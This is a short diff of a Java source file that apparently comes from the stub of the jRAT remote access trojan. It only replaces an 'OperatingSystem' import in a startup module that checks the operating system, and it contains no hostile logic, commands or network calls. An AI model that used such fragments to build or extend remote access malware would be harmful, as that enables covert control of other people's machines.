@@ -2,8 +2,9 @@ package se.jrat.stub.modules.startup;
 
 import java.util.Map;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Configuration;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 public class OperatingSystemCheckStartupModule extends StartupModule {
 	
